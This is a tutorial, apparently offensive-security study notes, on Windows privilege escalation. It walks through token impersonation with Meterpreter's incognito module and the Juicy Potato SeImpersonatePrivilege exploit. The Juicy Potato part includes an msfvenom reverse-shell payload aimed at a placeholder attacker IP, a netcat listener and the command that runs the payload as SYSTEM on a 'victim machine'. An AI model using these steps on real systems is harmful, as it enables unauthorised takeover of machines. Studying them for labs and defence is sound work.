# Token Impersonation (Windows Privilege Escalation)

### 🔑 What is a Token?

A **token** in Windows is like a **web cookie** — it temporarily grants access so a user doesn't need to re-enter credentials every time they access files or resources.

### 🧠 Types of Tokens

1. **Delegate Token**
    - Created during **interactive logins**
    - Example: When you log in via **Remote Desktop (RDP)** or directly at the machine
2. **Impersonation Token**
    - Created during **non-interactive logins**
    - Example: When you map a network drive or run a logon script

## **Step-by-Step Exploitation**

### **1. Get a Meterpreter Shell**

First establish a foothold on the target machine.

> ⚠️ Requires Meterpreter from Metasploit
> 

### **2. Load Incognito Module**

```
use incognito
```

### **3. List Available Tokens**

- **List available tokens:** `list_tokens -u`
- Look for **delegation** or **impersonation** tokens (especially those of admin/system users)

```
list_tokens -u
```

Example output:

```
Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
SNEAKS.IN\Administrator

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON
```

### **4. Impersonate a Privileged Token**

```
impersonate_token SNEAKS.IN\\Administrator
```

*Note:* Use double backslashes (**`\\`**) in the username

### **5. Verify Your New Identity**

```
getuid
```

### **6. Get a Shell with New Privileges**

```
shell
whoami
```

You should now be running as the impersonated user!


# 🥔 Juicy Potato — Privilege Escalation via SeImpersonatePrivilege

### 🔍 What is Juicy Potato?

**Juicy Potato** is a Windows local privilege escalation tool that abuses the **SeImpersonatePrivilege** to gain **SYSTEM-level access** from a low-privileged user account.

### ✅ Requirements

- You already have **a shell** (or Meterpreter session) on the **target machine**
- The user must have the `SeImpersonatePrivilege` **enabled**

### 🧪 Step-by-Step Guide

### 1️⃣ Check User Privileges

On the target machine, run:

```bash
whoami /priv
```

Look for this line:

```
SeImpersonatePrivilege      Enabled
```

> ✅ If it's enabled, you can continue with the Juicy Potato attack!
> 

### 2️⃣ Download Juicy Potato

Download the executable from:

👉 https://github.com/ohpe/juicy-potato

Rename it (for simplicity):

```bash
jp.exe
```

Copy it to the **victim machine**.

### 3️⃣ Create a Malicious Payload

On your **attacker machine** (Kali), generate a reverse shell in `.bat` format:

```bash
msfvenom -p cmd/windows/reverse_powershell LHOST=<Your_IP> LPORT=<Your_Port> -f raw > myshell.bat
```

Replace `<Your_IP>` and `<Your_Port>` with your Kali IP and chosen port.

Upload `myshell.bat` to the **victim machine**.

### 4️⃣ Start Netcat Listener

On your Kali machine:

```bash
nc -nlvp <Your_Port>
```

### 5️⃣ Run Juicy Potato Exploit

On the victim machine:

```bash
jp.exe -t * -p myshell.bat -l 4444
```

- `t *` = Try all available COM types
- `p myshell.bat` = The payload you want to run
- `l 4444` = Port used by the fake COM server (can be any unused port)

### 🎉 Result

You should now get a **reverse shell as SYSTEM** on your Netcat listener!
